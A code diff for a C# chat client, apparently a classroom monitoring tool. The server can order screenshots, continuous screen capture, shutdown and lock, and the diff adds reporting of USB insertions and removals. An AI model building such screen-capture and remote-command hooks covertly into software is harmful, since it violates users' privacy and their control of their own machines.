@@ -12,6 +12,7 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Runtime.InteropServices;
 
 namespace chatclient
 {
@@ -21,6 +22,11 @@ namespace chatclient
         private Socket _clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
         Thread t1;
         byte[] receivedBuf = new byte[1716964]; //1716964 450560
+
+        const int WM_DEVICECHANGE = 0x0219; 
+        const int DBT_DEVICEARRIVAL = 0x8000;
+        const int DBT_DEVICEREMOVALCOMPLETE = 0x8004;
+        const int DBT_DEVTYPVOLUME = 0x00000002;
 
 
         public Client()
@@ -36,14 +42,14 @@ namespace chatclient
         private void ReceiveData(IAsyncResult ar)
         {
             Socket socket = (Socket)ar.AsyncState;
-            if(socket.Connected)
+            if (socket.Connected)
             {
                 int received = socket.EndReceive(ar);
                 byte[] dataBuf = new byte[received];
                 Array.Copy(receivedBuf, dataBuf, received);
                 string text = Encoding.ASCII.GetString(dataBuf);
 
-                switch(text)
+                switch (text)
                 {
                     case "Capture":
                         capture();
@@ -59,7 +65,7 @@ namespace chatclient
                         break;
 
                     case "Shutdown":
-                        Command_operation("shutdown.exe","-s");
+                        Command_operation("shutdown.exe", "-s");
                         break;
 
                     case "Lock":
@@ -78,41 +84,41 @@ namespace chatclient
 
                 _clientSocket.BeginReceive(receivedBuf, 0, receivedBuf.Length, SocketFlags.None, new AsyncCallback(ReceiveData), _clientSocket);
             }
-          
+
         }
-        private void Command_operation(string filename , string arguments)
+        private void Command_operation(string filename, string arguments)
         {
             ProcessStartInfo startinfo = new ProcessStartInfo(filename, arguments);
-            Process.Start(startinfo);            
+            Process.Start(startinfo);
         }
-       
+
         private void Monitor()
         {
-            while(true)
+            while (true)
             {
                 try
                 {
                     capture();
                     Thread.Sleep(100);
                 }
-                catch (Exception) {}
+                catch (Exception) { }
             }
 
         }
 
-            private void capture()
-            {
+        private void capture()
+        {
 
-                Bitmap memoryImage = new Bitmap(1920, 1080);
-                Size s = new Size(memoryImage.Width, memoryImage.Height);
+            Bitmap memoryImage = new Bitmap(1920, 1080);
+            Size s = new Size(memoryImage.Width, memoryImage.Height);
 
-                Graphics memoryGraphics = Graphics.FromImage(memoryImage);
+            Graphics memoryGraphics = Graphics.FromImage(memoryImage);
 
-                memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
+            memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
 
-               _clientSocket.Send(converterDemo(memoryImage));
+            _clientSocket.Send(converterDemo(memoryImage));
 
-            }
+        }
 
 
         public static byte[] converterDemo(Image x)
@@ -122,7 +128,7 @@ namespace chatclient
             return xByte;
         }
 
-        
+
         private void LoopConnect()
         {
             int attempts = 0;
@@ -135,7 +141,7 @@ namespace chatclient
                 }
                 catch (SocketException)
                 {
-                   label2.Text = ("Connection attempts: " + attempts.ToString());
+                    label2.Text = ("Connection attempts: " + attempts.ToString());
                 }
             }
             label.Text = ("Connected!");
@@ -144,7 +150,7 @@ namespace chatclient
         private void Connectbtn_Click(object sender, EventArgs e)
         {
             Connectbtn.Enabled = false;
-           
+
             string name = $"{txtName.Text},{txtroll.Text},Connect";
 
             LoopConnect();
@@ -159,7 +165,7 @@ namespace chatclient
         private void Sendbtn_Click(object sender, EventArgs e)
         {
             if (_clientSocket.Connected)
-            { 
+            {
                 byte[] buffer = Encoding.ASCII.GetBytes(txtName.Text.ToUpper() + " : " + txtmsg.Text);
                 _clientSocket.Send(buffer);
                 txtchat.AppendText("You : " + txtmsg.Text + "\r\n");
@@ -170,9 +176,9 @@ namespace chatclient
         private void close_connection()
         {
 
-           _clientSocket.Shutdown(SocketShutdown.Both);
-           _clientSocket.Close();
-           _clientSocket = null;
+            _clientSocket.Shutdown(SocketShutdown.Both);
+            _clientSocket.Close();
+            _clientSocket = null;
 
         }
         private void Closebtn_Click(object sender, EventArgs e)
@@ -182,7 +188,7 @@ namespace chatclient
             byte[] buffer = Encoding.ASCII.GetBytes($"{txtName.Text.ToUpper()} : Closed Connection");
             _clientSocket.Send(buffer);
             _clientSocket.Shutdown(SocketShutdown.Both);
-           
+
         }
 
         private void Client_CLose(object sender, FormClosingEventArgs e)
@@ -192,12 +198,53 @@ namespace chatclient
                 byte[] buffer = Encoding.ASCII.GetBytes($"{txtName.Text.ToUpper()} : Closed Connection");
                 _clientSocket.Send(buffer);
                 close_connection();
-            } 
+            }
             else
             {
                 _clientSocket.Close();
                 _clientSocket = null;
             }
+        }
+
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct DEV_BROADCAST_VOLUME
+        {
+            public int dbcv_size;
+            public int dbcv_devicetype;
+            public int dbcv_reserved;
+            public int dbcv_unitmask;
+        }
+
+        protected override void WndProc(ref Message m)
+        {
+
+            switch(m.Msg)
+            {
+                case WM_DEVICECHANGE:
+                    switch((int)m.WParam)
+                    {
+                        case DBT_DEVICEARRIVAL:
+                            int devtype = Marshal.ReadInt32(m.LParam, 4);
+                            if(devtype == DBT_DEVTYPVOLUME)
+                            {
+                                //MessageBox.Show("USB Inserted");
+                                byte[] USB_I = Encoding.ASCII.GetBytes($"{txtName.Text.ToUpper()} : INSERTED USB");
+                                _clientSocket.Send(USB_I);
+                                DEV_BROADCAST_VOLUME vol;
+                                vol = (DEV_BROADCAST_VOLUME)Marshal.PtrToStructure(m.LParam, typeof(DEV_BROADCAST_VOLUME));
+                            }
+                            break;
+
+                        case DBT_DEVICEREMOVALCOMPLETE:
+                            byte[] buffer = Encoding.ASCII.GetBytes($"{txtName.Text.ToUpper()} : REMOVED USB");
+                            _clientSocket.Send(buffer);
+                            //MessageBox.Show("usb out");
+                            break;
+                    }
+                    break;
+            }
+            base.WndProc(ref m);
         }
     }
 }
